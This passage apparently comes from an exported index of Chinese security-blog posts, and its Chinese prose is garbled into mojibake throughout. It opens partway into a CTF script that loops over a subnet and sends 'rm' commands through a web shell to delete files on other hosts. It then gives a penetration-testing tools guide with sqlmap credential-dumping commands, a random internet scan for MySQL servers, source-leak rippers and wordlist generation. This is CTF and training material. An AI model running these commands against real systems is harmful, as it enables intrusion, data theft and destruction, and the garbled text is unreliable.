/home/ctf/apache-tomcat-7.0.79/webapps/jeecmsv9f/jeeadmin/jeecms/index.do'\n\n    r = requests.get(url,timeout=5)\n\t#åˆ é™¤é¡µé¢\n    url='http://192.200.1.'+str(num)+':8080/jeecmsv9f/thirdparty/ueditor/index.jsp?cmd=rm%20/home/ctf/apache-tomcat-7.0.79/webapps/jeecmsv9f/jeeadmin/jeecms/index.do'\n\n    r = requests.get(url,timeout=5)\n\n    print('\\n')\n\n    url='http://192.200.1.'+str(num)+':8080/jeeadmin/jeecms/index.do'\n\n    print('\\n')\n\n    print(r.text)\n```\nå‚è€ƒï¼š\n[å¿«é€Ÿä¸Šæ‰‹-Requests](https://requests.readthedocs.io/zh_CN/latest/)\n[é«˜çº§ç”¨æ³•-Requests](https://requests.readthedocs.io/zh_CN/latest/user/advanced.html)\n[è¯¦è§£CTF Webä¸­çš„å¿«é€Ÿåå¼¹POSTè¯·æ±‚](https://ciphersaw.me/2017/12/16/%E8%AF%A6%E8%A7%A3%20CTF%20Web%20%E4%B8%AD%E7%9A%84%E5%BF%AB%E9%80%9F%E5%8F%8D%E5%BC%B9%20POST%20%E8%AF%B7%E6%B1%82/)\n\n## èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥èµåŠ©æˆ‘ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["Requests"],"categories":["CTF"]},{"title":"æ¸—é€æµ‹è¯•-å·¥å…·ç¯‡","url":"/posts/49445.html","content":"![](https://img.jwt1399.top//img/20200824182154.jpg)\n\n## dirsearch-ç½‘ç«™ç›®å½•ç»“æ„æ‰«æå™¨\n\n> dirsearchæ˜¯ä¸€ä¸ªåŸºäºpythonçš„å‘½ä»¤è¡Œå·¥å…·ï¼Œæ—¨åœ¨æš´åŠ›æ‰«æé¡µé¢ç»“æ„ï¼ŒåŒ…æ‹¬ç½‘é¡µä¸­çš„ç›®å½•å’Œæ–‡ä»¶ã€‚\n\n### å®‰è£…ä¸ä½¿ç”¨\n\n```bash\n#å®‰è£…ï¼š\ngit clone https://github.com/maurosoria/dirsearch.git\n\n#ä½¿ç”¨ï¼š\ncd dirsearch/\n#è¿è¡Œéœ€è¦python3ç¯å¢ƒï¼š\npython3 dirsearch.py -u \"http://localhost/\" -e *     \n# æ‰«æç½‘ç«™éœ€è¦æŒ‡å®šç½‘ç«™çš„è„šæœ¬ç±»å‹ï¼Œ* ä¸ºå…¨éƒ¨ç±»å‹çš„è„šæœ¬\n```\n### ç”¨æ³•ç¤ºä¾‹\n\n![](https://i.loli.net/2020/04/13/pjJrQLVi6mahPtU.png)\n**æ‰«æç»“æœ**\næ‰«ææ—¶é—´ï¼ŒçŠ¶æ€ç ï¼Œå¤§å°ï¼Œæ‰«æçš„ç›®å½•ï¼Œé‡å®šå‘çš„åœ°å€\n\n![](https://i.loli.net/2020/04/13/IgUMdAiuc7HWs4n.png)\n\n## GitHack -ä¸€ä¸ªgitæ³„éœ²åˆ©ç”¨è„šæœ¬\n\n> GitHackæ˜¯ä¸€ä¸ª.gitæ³„éœ²åˆ©ç”¨æµ‹è¯•è„šæœ¬ï¼Œé€šè¿‡æ³„éœ²çš„æ–‡ä»¶ï¼Œè¿˜åŸé‡å»ºå·¥ç¨‹æºä»£ç ã€‚\n\nå½“å‰å¤§é‡å¼€å‘äººå‘˜ä½¿ç”¨gitè¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå°†.gitæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº†gitæ³„éœ²æ¼æ´ã€‚\n\nGitä¿¡æ¯æ³„éœ²çš„å±å®³å¾ˆå¤§ï¼Œæ¸—é€æµ‹è¯•äººå‘˜ã€æ”»å‡»è€…ï¼Œå¯ç›´æ¥ä»æºç è·å–æ•æ„Ÿé…ç½®ä¿¡æ¯ï¼ˆå¦‚ï¼šé‚®ç®±ï¼Œæ•°æ®åº“ï¼‰ï¼Œä¹Ÿå¯ä»¥è¿›ä¸€æ­¥å®¡è®¡ä»£ç ï¼ŒæŒ–æ˜æ–‡ä»¶ä¸Šä¼ ã€SQLæ³¨å°„ç­‰å®‰å…¨æ¼æ´ã€‚\n\n### å®‰è£…ä¸ä½¿ç”¨\n\n**ä¸‹è½½åœ°å€**:\nç‰ˆæœ¬1ï¼šhttps://github.com/lijiejie/GitHack  ä» `.git` æ–‡ä»¶å¤¹é‡å»ºæºä»£ç ï¼ŒåŒæ—¶ä¿æŒç›®å½•ç»“æ„ä¸å˜ã€‚\n\nç‰ˆæœ¬2ï¼šhttps://github.com/BugScanTeam/GitHack  `.git` æ³„æ¼åˆ©ç”¨å·¥å…·ï¼Œå¯è¿˜åŸå†å²ç‰ˆæœ¬\n\n**ä½¿ç”¨**ï¼š\n\n```bash\n# 1. åˆ‡æ¢åˆ°GitHackçš„è·¯å¾„ä¸‹\ncd GitHack-master\n# 2.æ‰§è¡Œpyè„šæœ¬\n python GitHack.py http://111.198.29.45:57559/.git/\n```\n\n**è„šæœ¬çš„å·¥ä½œåŸç†:**\n\n ```\n1. è§£æ.git/indexæ–‡ä»¶ï¼Œæ‰¾åˆ°å·¥ç¨‹ä¸­æ‰€æœ‰çš„ï¼š ( æ–‡ä»¶åï¼Œæ–‡ä»¶sha1 )\n2. å».git/objects/ æ–‡ä»¶å¤¹ä¸‹ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶\n3. ä½¿ç”¨zlibè§£å‹æ–‡ä»¶ï¼ŒæŒ‰åŸå§‹çš„ç›®å½•ç»“æ„å†™å…¥æºä»£ç \n ```\n**ä¼˜ç‚¹:**\n\n```\n1. é€Ÿåº¦å¿«ï¼Œé»˜è®¤20ä¸ªå·¥ä½œçº¿ç¨‹\n2. å°½é‡è¿˜åŸæ‰€æœ‰çš„æºä»£ç ï¼Œç¼ºå¤±ä¸€éƒ¨åˆ†æ–‡ä»¶ä¸å½±å“è„šæœ¬å·¥ä½œ\n3. è„šæœ¬ä¸éœ€è¦æ‰§è¡Œé¢å¤–çš„gitå‘½ä»¤ï¼Œæœ‰pythonå°±å¤Ÿäº†\n```\n\n### ç”¨æ³•ç¤ºä¾‹\n\n`æ­¤ä¾‹å­ä¸ºæ”»é˜²ä¸–ç•Œ-web-mfw`\n\n![](https://i.loli.net/2020/04/13/KpZ53WvtsnzBSld.png) \n\né‡å»ºçš„å·¥ç¨‹æºä»£ç åœ¨GitHackæ–‡ä»¶å¤¹ä¸­\n\n![](https://i.loli.net/2020/04/13/uDRkOJqKtEQibTU.png)\n\n\nå‚è€ƒï¼š[https://www.secpulse.com/archives/6275.html](https://www.secpulse.com/archives/6275.html)\n\n## .DS_Store-æ–‡ä»¶æ³„æ¼åˆ©ç”¨è„šæœ¬\n\n> .DS_Store(è‹±æ–‡å…¨ç§° Desktop Services Store)æ˜¯ä¸€ç§ç”±è‹¹æœå…¬å¸çš„Mac OS Xæ“ä½œç³»ç»Ÿæ‰€åˆ›é€ çš„éšè—æ–‡ä»¶ï¼Œç›®çš„åœ¨äºå­˜è´®ç›®å½•çš„è‡ªå®šä¹‰å±æ€§ï¼Œä¾‹å¦‚æ–‡ä»¶ä»¬çš„å›¾æ ‡ä½ç½®æˆ–è€…æ˜¯èƒŒæ™¯è‰²çš„é€‰æ‹©ã€‚ç›¸å½“äº Windows ä¸‹çš„ desktop.iniã€‚\n\n### å®‰è£…\n\n```bash\n#å®‰è£…ï¼š\ngit clone https://github.com/lijiejie/ds_store_exp.git\npip install -r requirements.txt\n\n#ä½¿ç”¨ï¼š\ncd \\A-CTFtools\\è„šæœ¬\\Web\\ds_store_exp-master   #åˆ‡æ¢åˆ°ä½ å®‰è£…çš„è·¯å¾„ä¸‹\nè¿è¡Œéœ€è¦python2ç¯å¢ƒï¼š\npython ds_store_exp.py http://www.example.com/.DS_Store\n```\n### ç”¨æ³•ç¤ºä¾‹\n\n `æ­¤ä¾‹å­ä¸ºbugku-sqlæ³¨å…¥2`\né€šè¿‡æ‰«æå‘ç°`.DS_Store`æ–‡ä»¶æ³„éœ²\n![](https://i.loli.net/2020/04/13/KP4pwMbSRr968Dj.png)\nä½¿ç”¨è„šæœ¬æŸ¥çœ‹`.DS_Store`æ–‡ä»¶\n![](https://i.loli.net/2020/04/13/MU2Hk7wQlmEOGzZ.png)\nè®¿é—®å‘ç°çš„è·¯å¾„å¾—åˆ°flag\n\n## dvcs-ripper-ç‰ˆæœ¬æ§åˆ¶è½¯ä»¶ä¿¡æ¯æ³„éœ²åˆ©ç”¨å·¥å…·\n\n> ä¸€æ¬¾perlçš„ç‰ˆæœ¬æ§åˆ¶è½¯ä»¶ä¿¡æ¯æ³„éœ²åˆ©ç”¨å·¥å…·ï¼Œæ”¯æŒSVN, GIT, Mercurial/hg, bzrâ€¦ gitæ³„éœ²æ¨èä½¿ç”¨Githackï¼ŒåŠŸèƒ½æ›´å¼º\n\n### å®‰è£…\n\n```\nsudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl\n\nsudo apt-get install libparallel-forkmanager-perl libredis-perl libalgorithm-combinatorics-perl\n\nsudo apt-get install cvs subversion git bzr mercurial\n\ngit clone https://github.com/kost/dvcs-ripper\n```\n\n### ç”¨æ³•ç¤ºä¾‹\n\n```bash\n# 1. åˆ‡æ¢åˆ°dvcs-ripperçš„è·¯å¾„ä¸‹\ncd dvcs-ripper\n\n# 2.æ‰§è¡Œè„šæœ¬\n#SVN\nperl rip-svn.pl -v -u http://www.example.com/.svn/\n\n#HG\nperl rip-hg.pl -v -u http://www.example.com/.hg/\n\n#Git\nperl rip-git.pl -v -u http://www.example.com/.git/\n\n#bzr\nperl rip-bzr.pl -v -u http://www.example.com/.bzr/\n\n#CVS\nperl rip-cvs.pl -v -u http://www.example.com/CVS/\n```\n\n`æ­¤ä¾‹å­ä¸ºCTFHub-SVNæ³„éœ²`\n\n```bash\n# 1. åˆ‡æ¢åˆ°dvcs-ripperçš„è·¯å¾„ä¸‹\ncd dvcs-ripper\n\n# 2.æ‰§è¡Œperlè„šæœ¬\nperl rip-svn.pl -v -u http://challenge-8df627014df49067.sandbox.ctfhub.com:10080/.svn/\n```\n\n![](https://img.jwt1399.top//img/20200716193721.png)\n\n3.è¿›å…¥`.svn/pristine/`æ–‡ä»¶å¤¹ä¸‹ï¼Œ åœ¨`bf`æ–‡ä»¶å¤¹ä¸‹å‘ç°`xxx.svn-base`æºç æ–‡ä»¶ï¼ŒæŸ¥çœ‹å¾—åˆ°flag\n\n![](https://img.jwt1399.top//img/20200716193224.png)\n\n## SQLmap-è‡ªåŠ¨SQLæ³¨å…¥å·¥å…·\n\n> SQLmapæ˜¯ä¸€æ¬¾ç”¨æ¥æ£€æµ‹ä¸åˆ©ç”¨SQLæ³¨å…¥æ¼æ´çš„å…è´¹å¼€æºå·¥å…·ï¼Œæœ‰ä¸€ä¸ªéå¸¸æ£’çš„ç‰¹æ€§ï¼Œå³å¯¹æ£€æµ‹ä¸åˆ©ç”¨çš„è‡ªåŠ¨åŒ–å¤„ç†ï¼ˆæ•°æ®åº“æŒ‡çº¹ã€è®¿é—®åº•å±‚æ–‡ä»¶ç³»ç»Ÿã€æ‰§è¡Œå‘½ä»¤ï¼‰ã€‚\n\n### å®‰è£…\n\n**windowså®‰è£…æ–¹æ³•ï¼š**[Windowsä¸‹sqlmapçš„å®‰è£…å›¾è§£](https://www.cnblogs.com/jackzz/p/10894089.html)\n\n**Linuxå®‰è£…æ–¹æ³•:**\n\n```bash\nwget https://codeload.github.com/sqlmapproject/sqlmap/legacy.tar.gz/master #ä¸‹è½½sqlmap\ntar zxvf master  #è§£å‹å‹ç¼©åŒ…\ncd sqlmapproject-sqlmap-310d79b/   #è¿›å…¥è§£å‹ç›®å½•\npython sqlmap.py -h  #å¼€å§‹ä½¿ç”¨\n```\n\n### ç”¨æ³•ç¤ºä¾‹\n\n(1) çŒœè§£æ˜¯å¦èƒ½æ³¨å…¥\n\n```bash\nwin: python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 \n\nkali: sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1\n```\n\n(2) æŸ¥æ‰¾æ•°æ®åº“\n```bash\nwin:python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --dbs   # ?id=1 --current-db(å½“å‰æ•°æ®åº“)\n\nkali: sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --dbs\n```\n(3) çŒœè§£è¡¨(å‡å¦‚é€šè¿‡(2)å¾—åˆ°äº†web1è¿™ä¸ªæ•°æ®åº“)\n```bash\nwin: python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1  --tables -D web1\n\nkali: sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tables -D web1\n```\n\n\n(4) æ ¹æ®çŒœè§£çš„è¡¨è¿›è¡ŒçŒœè§£è¡¨çš„å­—æ®µ(å‡å¦‚é€šè¿‡(3)å¾—åˆ°äº†flagè¿™ä¸ªè¡¨)\n```bash\nwin: python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --columns -T flag -D web1\n\nkali: sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --columns -T flag -D web1\n```\n\n\n(5) æ ¹æ®å­—æ®µçŒœè§£å†…å®¹(å‡å¦‚é€šè¿‡(4)å¾—åˆ°å­—æ®µä¸ºusernameå’Œpassword)\n```bash\nwin: python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --dump -C \"username,password\" -T flag -D web1\n\nkali: sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --dump -C \"username,password\" -T flag -D web1\n```\n\n\nTargetï¼ˆç›®æ ‡ï¼‰ï¼š\nä»¥ä¸‹è‡³å°‘éœ€è¦è®¾ç½®å…¶ä¸­ä¸€ä¸ªé€‰é¡¹ï¼Œè®¾ç½®ç›®æ ‡URLã€‚\n```bash\n    -d (DIRECT) ç›´æ¥è¿æ¥åˆ°æ•°æ®åº“ã€‚\n    -u (URL), â€“url=URL ç›®æ ‡URLã€‚\n    -l (LIST) ä»Burpæˆ–WebScarabä»£ç†çš„æ—¥å¿—ä¸­è§£æç›®æ ‡ã€‚\n    -r (REQUESTFILE) ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è½½å…¥HTTPè¯·æ±‚ã€‚\n    -g ï¼ˆGOOGLEDORK) å¤„ç†Google dorkçš„ç»“æœä½œä¸ºç›®æ ‡URLã€‚\n    -c (CONFIGFILE) ä»INIé…ç½®æ–‡ä»¶ä¸­åŠ è½½é€‰é¡¹ã€‚\n```\n**Enumerationï¼ˆæšä¸¾ï¼‰ï¼š**\nè¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥åˆ—ä¸¾åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ä¿¡æ¯ã€è¡¨ä¸­çš„ç»“æ„å’Œæ•°æ®ã€‚æ­¤å¤–ï¼Œæ‚¨è¿˜å¯ä»¥è¿è¡Œæ‚¨è‡ªå·±çš„SQLè¯­å¥ã€‚\n\n```bash\n--tamper=space2comment ç»•è¿‡ç©ºæ ¼ ï¼ˆ--tamper=space2comment --dbsï¼‰\n-a æ£€ç´¢æ‰€æœ‰å†…å®¹\n-b, â€“banner æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ ‡è¯†\n-D (DBname) æšä¸¾çš„æŒ‡å®šæ•°æ®åº“åä¸­ä¿¡æ¯\n-T (TBLname) æšä¸¾çš„æŒ‡å®šæ•°æ®åº“è¡¨ä¸­ä¿¡æ¯ï¼ˆegï¼š-T tablename â€“columnsï¼‰\n-C (COL ) æšä¸¾çš„æŒ‡å®šæ•°æ®åº“å­—æ®µ(åˆ—)ä¿¡æ¯ (egï¼š-C flag -T flag -D web1 <---> -C å­—æ®µå -T è¡¨å -D æ•°æ®åº“å)\n-U (USER) ç”¨æ¥è¿›è¡Œæšä¸¾çš„æ•°æ®åº“ç”¨æˆ·\n--dbs æ‰«ææ•°æ®åº“ä¿¡æ¯\n--tables åˆ—å‡ºæ•°æ®åº“æ‰€æœ‰çš„è¡¨ä¿¡æ¯\n--columns åˆ—å‡ºæ•°æ®åº“è¡¨ä¸­çš„æ‰€æœ‰å­—æ®µä¿¡æ¯(è¡¨åˆ—)\n--current-db åˆ—å‡ºå½“å‰çš„æ•°æ®åº“åç§°\n-current-user æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰ç”¨æˆ·\n--roles æšä¸¾ç”¨æˆ·\n-dump åˆ—å‡ºæ•°æ®åº“ä¸­è¡¨çš„å­—æ®µåä¸­ä¿¡æ¯\n--dump-all åˆ—æ‰€æœ‰è¡¨çš„å†…å®¹\n--exclude-sysdbs åˆ—ä¸¾ç”¨æˆ·æ•°æ®åº“çš„è¡¨å†…å®¹\n--common-tablesæš´åŠ›ç ´è§£è¡¨\n-is-dba æ£€æµ‹DBMSå½“å‰ç”¨æˆ·æ˜¯å¦DBA\n-users æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·\n-passwords æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·å¯†ç å“ˆå¸Œ\n-privileges æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„æƒé™\n-columns æšä¸¾DBMSæ•°æ®åº“è¡¨åˆ—-dump è½¬å‚¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ•°æ®åº“ä¸­çš„è¡¨é¡¹\n-search æœç´¢åˆ—ï¼ˆSï¼‰ï¼Œè¡¨ï¼ˆSï¼‰å’Œ/æˆ–æ•°æ®åº“åç§°ï¼ˆSï¼‰\n-start=LIMITSTART ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºè¿›å…¥æ£€ç´¢\n-stop=LIMITSTOP æœ€åæŸ¥è¯¢çš„è¾“å‡ºè¿›å…¥æ£€ç´¢\n-first=FIRSTCHAR ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºå­—çš„å­—ç¬¦æ£€ç´¢\n-last=LASTCHAR æœ€åæŸ¥è¯¢çš„è¾“å‡ºå­—å­—ç¬¦æ£€ç´¢\n-sql-query=QUERY è¦æ‰§è¡Œçš„SQLè¯­å¥\n-sql-shell æç¤ºäº¤äº’å¼SQLçš„shell\n```\n\næ›´å¤šå‚è€ƒæˆ‘å¦ä¸€ç¯‡æ–‡ç« ï¼šhttps://www.jianshu.com/p/a46abd1e67aa\n\n## Nmap-ç½‘ç»œæ‰«æå·¥å…·\n\n### ç®€ä»‹\n\n>nmap(Network Mapper)æ˜¯ä¸€ä¸ªç½‘ç»œè¿æ¥ç«¯æ‰«æè½¯ä»¶ï¼Œç”¨æ¥æ‰«æç½‘ä¸Šç”µè„‘å¼€æ”¾çš„ç½‘ç»œè¿æ¥ç«¯ã€‚ç¡®å®šå“ªäº›æœåŠ¡è¿è¡Œåœ¨å“ªäº›è¿æ¥ç«¯ï¼Œå¹¶ä¸”æ¨æ–­è®¡ç®—æœºè¿è¡Œå“ªä¸ªæ“ä½œç³»ç»Ÿï¼ˆè¿™æ˜¯äº¦ç§° fingerprintingï¼‰ã€‚å®ƒæ˜¯ç½‘ç»œç®¡ç†å‘˜å¿…ç”¨çš„è½¯ä»¶ä¹‹ä¸€ï¼Œä»¥åŠç”¨ä»¥è¯„ä¼°ç½‘ç»œç³»ç»Ÿå®‰å…¨ã€‚\n\n### æ ¸å¿ƒåŠŸèƒ½\n\n1.1\tä¸»æœºå‘ç°\n1.2\tç«¯å£æ‰«æ\n1.3\tç‰ˆæœ¬ä¾¦æµ‹\n1.4\tæ“ä½œç³»ç»Ÿä¾¦æµ‹\n1.5\té˜²ç«å¢™/IDSè§„é¿å’Œå“„éª—\n1.6\tNSEè„šæœ¬å¼•æ“\n\n### åŸºæœ¬å‘½ä»¤å’Œå…¸å‹ç”¨æ³•\nNmap åŸºæœ¬è¯­æ³•\n```\nnmap [ <æ‰«æç±»å‹> ...] [ <é€‰é¡¹> ] { <æ‰«æç›®æ ‡è¯´æ˜> }\n```\nå…¨é¢è¿›æ”»æ€§æ‰«æï¼ˆåŒ…æ‹¬å„ç§ä¸»æœºå‘ç°ã€ç«¯å£æ‰«æã€ç‰ˆæœ¬æ‰«æã€OSæ‰«æåŠé»˜è®¤è„šæœ¬æ‰«æï¼‰:\n```\nnmap -A -v target_ip\n```\nPingæ‰«æ:\n```\nnmap -sn -v target_ip\n```\nå¿«é€Ÿç«¯å£æ‰«æ:\n```\nnmap -F -v target_ip\n```\nç‰ˆæœ¬æ‰«æ:\n```\nnmap -sV -v target_ip \n```\næ“ä½œç³»ç»Ÿæ‰«æ:\n```\nnmap -O -v target_ip\n```\n### å¸¸ç”¨å‘½ä»¤\n\n```\nnmap -p 0-65535  target_ip   #æ‰«æç«¯å£\nnmap -sV  target_ip          #æ‰«æç«¯å£å’Œå¯¹åº”æœåŠ¡\nnmap -sP  network_segment    #æ‰«æç½‘ç»œå­˜æ´»ä¸»æœº\nnmap -O   target_ip          #æ‰«ææ“ä½œç³»ç»Ÿ\nnmap -sS -sV --script=xxx.nse target_ip  #ä½¿ç”¨è„šæœ¬æ‰«ææ¼æ´\nnmap -iR 10  -p 3306  éšæœºç”Ÿæˆ10ä¸ªäº’è”ç½‘ä¸Šçš„IPï¼Œä»ä¸­æ‰¾å‡ºmysqlæœåŠ¡å™¨ã€‚\n```\n\n\n\n### è¯¦ç»†ç”¨æ³•\n\n[ä¸è€çš„ç¥å™¨ï¼šå®‰å…¨æ‰«æå™¨Nmapæ¸—é€ä½¿ç”¨æŒ‡å—](https://www.freebuf.com/news/141607.html)\n[nmapçš„å¸¸ç”¨å‘½ä»¤è¡¨](https://www.uedbox.com/post/54108/)\n\n![](https://i.loli.net/2019/08/06/bNBTEDpo485wjfa.png)\n\n## AWVS-æ¼æ´æ‰«æå·¥å…·\n\n> Acunetix Web Vulnerability Scannerï¼ˆç®€ç§°AWVSï¼‰æ˜¯ä¸€æ¬¾çŸ¥åçš„ç½‘ç»œæ¼æ´æ‰«æå·¥å…·ï¼Œå®ƒé€šè¿‡ç½‘ç»œçˆ¬è™«æµ‹è¯•ä½ çš„ç½‘ç«™å®‰å…¨ï¼Œæ£€æµ‹æµè¡Œå®‰å…¨æ¼æ´ã€‚AWVSå¯ä»¥æ£€æŸ¥SQLæ³¨å…¥æ¼æ´ï¼Œä¹Ÿå¯ä»¥æ£€æŸ¥è·¨ç«™è„šæœ¬æ”»å‡»æ¼æ´ï¼Œå¯ä»¥æ‰«æä»»ä½•å¯ä»¥é€šè¿‡webæµè§ˆè®¿é—®å’Œéµå¾ªHTTP/HTTPSè§„åˆ™çš„webç«™ç‚¹å’Œwebåº”ç”¨ç¨‹åºã€‚\n\nå®˜ç½‘åœ°å€ï¼šhttps://www.acunetix.com/vulnerability-scanner/\n\n[AWVSå®‰è£…ä¸ä½¿ç”¨](https://blog.csdn.net/Fly_hps/article/details/99620560)\n\n[acunetix_WVS 13.åŸºç¡€ä½¿ç”¨](https://blog.csdn.net/qq_41901122/article/details/104757589?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase)\n\n## Crunch-å­—å…¸ç”Ÿæˆå·¥å…·\n\n> Crunchæ˜¯ä¸€ç§åˆ›å»ºå¯†ç å­—å…¸å·¥å…·ï¼ŒæŒ‰ç…§æŒ‡å®šçš„è§„åˆ™ç”Ÿæˆå¯†ç å­—å…¸ï¼Œå¯ä»¥çµæ´»çš„åˆ¶å®šè‡ªå·±çš„å­—å…¸æ–‡ä»¶ã€‚ä½¿ç”¨Crunchå·¥å…·ç”Ÿæˆçš„å¯†ç å¯ä»¥è¾“å‡ºåˆ°å±å¹•ï¼Œä¿å­˜åˆ°æ–‡ä»¶ã€æˆ–å¦ä¸€ä¸ªç¨‹åºã€‚\n\n### è¯­æ³•å’Œå‚æ•°\n\n```bash\ncrunch <min> <max> [options] [<charset string>]\n\n#å‚æ•°è¯¦è§£\n     min    è®¾å®šæœ€å°å­—ç¬¦ä¸²é•¿åº¦ï¼ˆå¿…é€‰ï¼‰\n     max    è®¾å®šæœ€å¤§å­—ç¬¦ä¸²é•¿åº¦ï¼ˆå¿…é€‰ï¼‰\n\t <charset string>   æŒ‡å®šå­—ç¬¦é›†è®¾ç½®\n\t  \n     oprions\n     -b     æŒ‡å®šæ–‡ä»¶è¾“å‡ºçš„å¤§å°ï¼Œé¿å…å­—å…¸æ–‡ä»¶è¿‡å¤§  \n     -c     æŒ‡å®šæ–‡ä»¶è¾“å‡ºçš„è¡Œæ•°ï¼Œå³åŒ…å«å¯†ç çš„ä¸ªæ•°\n     -d     é™åˆ¶ç›¸åŒå…ƒç´ å‡ºç°çš„æ¬¡æ•°\n     -e     å®šä¹‰åœæ­¢å­—ç¬¦ï¼Œå³åˆ°è¯¥å­—ç¬¦ä¸²å°±åœæ­¢ç”Ÿæˆ\n     -f     è°ƒç”¨åº“æ–‡ä»¶ï¼ˆ/etc/share/crunch/charset.lstï¼‰\n     -i     æ”¹å˜è¾“å‡ºæ ¼å¼ï¼Œå³aaa,aab -> aaa,baa\n     -I     é€šå¸¸ä¸-tè”åˆä½¿ç”¨ï¼Œè¡¨æ˜è¯¥å­—ç¬¦ä¸ºå®ä¹‰å­—ç¬¦\n     -m     é€šå¸¸ä¸-pæ­é…\n     -o     å°†å¯†ç ä¿å­˜åˆ°æŒ‡å®šæ–‡ä»¶\n     -p     æŒ‡å®šå…ƒç´ ä»¥ç»„åˆçš„æ–¹å¼è¿›è¡Œ\n     -q     è¯»å–å¯†ç æ–‡ä»¶ï¼Œå³è¯»å–pass.txt\n     -r     å®šä¹‰é‡æŸä¸€å­—ç¬¦ä¸²é‡æ–°å¼€å§‹\n     -s     æŒ‡å®šä¸€ä¸ªå¼€å§‹çš„å­—ç¬¦ï¼Œå³ä»è‡ªå·±å®šä¹‰çš„å¯†ç xxxxå¼€å§‹\n     -t     æŒ‡å®šå¯†ç è¾“å‡ºçš„æ ¼å¼\n     -u     ç¦æ­¢æ‰“å°ç™¾åˆ†æ¯”ï¼ˆå¿…é¡»ä¸ºæœ€åä¸€ä¸ªé€‰é¡¹ï¼‰\n     -z     å‹ç¼©ç”Ÿæˆçš„å­—å…¸æ–‡ä»¶ï¼Œæ”¯æŒgzip,bzip2,lzma,7z  \n```\n\n### ç”¨æ³•ç¤ºä¾‹\n\n```bash\nroot@kali:~# crunch -h\n\n#ç”Ÿæˆæœ€å°ä¸º1 ï¼Œæœ€å¤§ä¸º8ä½ï¼Œå…¨éƒ¨ç”±å­—æ¯ç»„æˆ\nroot@kali:~#crunch 1 8  \n\n#ç”Ÿæˆæœ€å°ä¸º1 ï¼Œæœ€å¤§ä¸º2ä½ï¼Œå…¨éƒ¨ç”±abcç»„æˆ\nroot@kali:~# crunch 1 2 abc  \n\n#ç”Ÿæˆæœ€å°ä¸º1 ï¼Œæœ€å¤§ä¸º6ä½ï¼Œå…¨éƒ¨ç”±abcå’Œç©ºæ ¼ç»„æˆ\nroot@kali:~# crunch 1 6 ab\\  \n\n#ç”Ÿæˆæœ€å°ä¸º1 æœ€å¤§ä¸º8 è°ƒç”¨ç³»ç»Ÿé‡Œé¢çš„å…ƒç´ å¯†ç åº“ä¸­çš„mixalpha-numeric-all-space,å¹¶ä¿å­˜ä¸ºwordlist.txtæ–‡ä»¶\nroot@kali:~#crunch 1 8 -f /usr /crunch arset.lst mixalpha-numeric-all-space -o wordlist.txt\n\n#è°ƒç”¨ç³»ç»Ÿé‡Œé¢çš„å…ƒç´ å¯†ç åº“ä¸­çš„mixalpha-numeric-all-spaceè¿™ä¸€é¡¹ ç”Ÿæˆ8ä½å¯†ç ï¼Œç”Ÿæˆæ ¼å¼â€œä¸¤ä¸ªå°å†™å­—æ¯+dog+ä¸¤ä¸ªå°å†™å­—æ¯\"ï¼Œå¹¶ä»¥cbdogå¼€å¤´ã€‚\nroot@kali:~# crunch 8 8 -f /usr /crunch arset.lst  mixalpha-numeric-all-space -o wordlist.txt -t @@dog@@@ -s cbdog\n\n#è°ƒç”¨ç³»ç»Ÿé‡Œé¢çš„å…ƒç´ å¯†ç åº“ä¸­çš„ualphaè¿™ä¸€é¡¹ã€‚ç”Ÿæˆ2-3ä½å¯†ç ï¼Œå¹¶ä»¥BBå¼€å¤´ -s ä»¥ä»€ä¹ˆä¸ºå¼€å¤´\nroot@kali:~#crunch 2 3 -f /usr /crunch arset.lst ualpha -s BB\n\n\n#ç”Ÿæˆ   ä½†æ˜¯å‰é¢æ— 